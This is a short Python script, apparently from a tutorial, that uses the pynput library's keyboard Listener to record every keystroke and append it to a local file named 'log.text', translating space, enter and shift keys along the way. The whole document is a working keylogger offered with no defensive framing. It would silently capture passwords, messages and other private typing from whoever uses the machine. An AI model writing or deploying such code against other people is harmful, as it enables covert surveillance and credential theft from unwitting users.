# Listeners - Listen to keystrokes
# Use of the 'with' keyword - Release memory/resources automatically

from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'" , "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.ctrl_l':
        letter = " "


    with open("log.text",'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()
